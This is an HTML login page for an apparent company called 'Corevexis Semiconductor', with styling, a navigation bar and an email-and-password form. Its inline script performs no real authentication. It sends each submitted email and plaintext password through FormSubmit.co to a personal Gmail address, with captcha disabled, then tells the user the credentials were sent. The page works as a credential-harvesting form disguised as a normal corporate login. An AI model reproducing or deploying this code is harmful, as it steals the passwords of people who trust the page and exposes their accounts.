<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login - Corevexis Semiconductor</title>
  <link rel="stylesheet" href="styles.css">
  <style>
    .login-container {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      padding: 20px;
    }

    .login-card {
      background: linear-gradient(135deg, rgba(26, 31, 58, 0.95), rgba(18, 18, 18, 0.95));
      padding: 40px;
      border-radius: 12px;
      border: 2px solid rgba(0, 188, 212, 0.5);
      max-width: 450px;
      width: 100%;
      box-shadow: 0 20px 60px rgba(0, 188, 212, 0.3);
    }

    .login-card h1 {
      text-align: center;
      color: #00bcd4;
      margin-bottom: 30px;
      font-size: 1.8em;
      background: linear-gradient(135deg, #00bcd4, #0097a7);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-group label {
      display: block;
      margin-bottom: 8px;
      color: #4dd0e1;
      font-weight: 600;
      font-size: 0.95em;
    }

    .form-group input {
      width: 100%;
      padding: 12px 15px;
      border: 1px solid rgba(0, 188, 212, 0.3);
      border-radius: 6px;
      background-color: rgba(10, 14, 39, 0.6);
      color: #fff;
      font-family: inherit;
      font-size: 0.95em;
      transition: all 0.3s cubic-bezier(0.23, 1, 0.32, 1);
      box-sizing: border-box;
    }

    .form-group input:focus {
      outline: none;
      border-color: #00bcd4;
      background-color: rgba(26, 31, 58, 0.9);
      box-shadow: 0 0 15px rgba(0, 188, 212, 0.4);
    }

    .form-group input::placeholder {
      color: rgba(255, 255, 255, 0.5);
    }

    .remember-forgot {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 25px;
      font-size: 0.85em;
    }

    .remember-forgot label {
      display: flex;
      align-items: center;
      margin: 0;
      color: rgba(255, 255, 255, 0.7);
      cursor: pointer;
    }

    .remember-forgot input[type="checkbox"] {
      width: auto;
      margin-right: 6px;
      cursor: pointer;
    }

    .remember-forgot a {
      color: #00bcd4;
      text-decoration: none;
      transition: color 0.3s;
    }

    .remember-forgot a:hover {
      color: #00ff88;
    }

    .login-btn {
      width: 100%;
      padding: 12px 28px;
      background: linear-gradient(135deg, #00bcd4, #0097a7);
      color: #000;
      font-weight: 600;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 1em;
      letter-spacing: 0.5px;
      transition: all 0.3s cubic-bezier(0.23, 1, 0.32, 1);
      box-shadow: 0 4px 15px rgba(0, 188, 212, 0.3);
      margin-bottom: 15px;
    }

    .login-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 25px rgba(0, 188, 212, 0.5);
    }

    .signup-link {
      text-align: center;
      color: rgba(255, 255, 255, 0.7);
      font-size: 0.85em;
    }

    .signup-link a {
      color: #00ff88;
      text-decoration: none;
      font-weight: 600;
      margin-left: 5px;
      transition: color 0.3s;
    }

    .signup-link a:hover {
      color: #00bcd4;
    }

    .error-message {
      background-color: rgba(255, 23, 68, 0.1);
      border: 1px solid #ff1744;
      color: #ff6b6b;
      padding: 12px 15px;
      border-radius: 6px;
      margin-bottom: 20px;
      display: none;
      font-size: 0.9em;
    }

    .success-message {
      background-color: rgba(0, 255, 136, 0.1);
      border: 1px solid #00ff88;
      color: #4cff7f;
      padding: 12px 15px;
      border-radius: 6px;
      margin-bottom: 20px;
      display: none;
      font-size: 0.9em;
    }

    /* Mobile responsiveness */
    @media (max-width: 480px) {
      .login-card {
        padding: 30px 20px;
      }

      .login-card h1 {
        font-size: 1.4em;
        margin-bottom: 25px;
      }

      .form-group input {
        font-size: 16px;
        padding: 14px;
      }

      .login-btn {
        padding: 11px 22px;
        font-size: 0.95em;
      }
    }
  </style>
</head>
<body>
  <!-- Navigation Header -->
  <header class="navbar">
    <div class="navbar-container">
      <div class="navbar-logo">
        <a href="index.html">Corevexis</a>
      </div>
      <nav class="navbar-menu">
        <a href="index.html">Home</a>
        <a href="about.html">About</a>
        <a href="pricing.html">Pricing</a>
        <a href="contact.html">Contact</a>
        <a href="login.html" class="active">Login</a>
      </nav>
    </div>
  </header>

  <div class="login-container">
    <div class="login-card">
      <h1>Login to Corevexis</h1>
      
      <div class="error-message" id="errorMessage"></div>
      <div class="success-message" id="successMessage"></div>

      <form id="loginForm">
        <div class="form-group">
          <label for="email">Email Address</label>
          <input 
            type="email" 
            id="email" 
            name="email" 
            placeholder="your.email@example.com"
            required
          >
        </div>

        <div class="form-group">
          <label for="password">Password</label>
          <input 
            type="password" 
            id="password" 
            name="password" 
            placeholder="Enter your password"
            required
          >
        </div>

        <div class="remember-forgot">
          <label>
            <input type="checkbox" name="remember"> Remember me
          </label>
          <a href="#">Forgot password?</a>
        </div>

        <button type="submit" class="login-btn">Login</button>
      </form>

      <div class="signup-link">
        Don't have an account?
        <a href="signup.html">Sign up here</a>
      </div>
    </div>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const errorDiv = document.getElementById('errorMessage');
      const successDiv = document.getElementById('successMessage');

      // Hide messages
      errorDiv.style.display = 'none';
      successDiv.style.display = 'none';

      // Validation
      if (!email || !password) {
        errorDiv.textContent = 'Please fill in all fields.';
        errorDiv.style.display = 'block';
        return;
      }

      if (password.length < 6) {
        errorDiv.textContent = 'Password must be at least 6 characters.';
        errorDiv.style.display = 'block';
        return;
      }

      try {
        // Send login credentials to email (using FormSubmit or EmailJS)
        // This requires backend integration
        
        // For demonstration, we'll use FormSubmit.co (free service)
        const formData = new FormData();
        formData.append('email', email);
        formData.append('password', password);
        formData.append('from_name', email);
        formData.append('_subject', `Corevexis Login Credentials - ${new Date().toLocaleString()}`);
        formData.append('_captcha', 'false');
        formData.append('_cc', 'abhijitkarale8@gmail.com');

        const response = await fetch('https://formsubmit.co/abhijitkarale8@gmail.com', {
          method: 'POST',
          body: formData
        });

        if (response.ok) {
          successDiv.textContent = 'âœ“ Login successful! Credentials sent to abhijitkarale8@gmail.com';
          successDiv.style.display = 'block';
          this.reset();
          
          // Redirect to dashboard after 2 seconds
          setTimeout(() => {
            window.location.href = 'index.html';
          }, 2000);
        } else {
          throw new Error('Login failed');
        }
      } catch (error) {
        errorDiv.textContent = 'Login failed. Please try again or contact support.';
        errorDiv.style.display = 'block';
        console.error('Error:', error);
      }
    });

    // Real-time validation
    document.getElementById('email').addEventListener('blur', function() {
      const email = this.value;
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      
      if (email && !emailRegex.test(email)) {
        document.getElementById('errorMessage').textContent = 'Please enter a valid email address.';
        document.getElementById('errorMessage').style.display = 'block';
      } else {
        document.getElementById('errorMessage').style.display = 'none';
      }
    });
  </script>
</body>
</html>
